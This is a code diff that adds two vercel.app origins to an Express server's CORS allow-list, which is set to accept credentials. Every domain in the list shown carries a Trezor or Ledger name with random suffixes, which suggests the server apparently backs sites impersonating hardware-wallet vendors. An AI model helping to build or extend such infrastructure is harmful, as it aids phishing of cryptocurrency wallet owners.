@@ -15,6 +15,8 @@ app.use(cors({
         "https://trezor-aws-oman-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
         "https://ledger-aws-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://ledger-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://trezor-aws-kei3-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://trezor-mlv9-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app"
     ], 
     methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
     credentials: true,
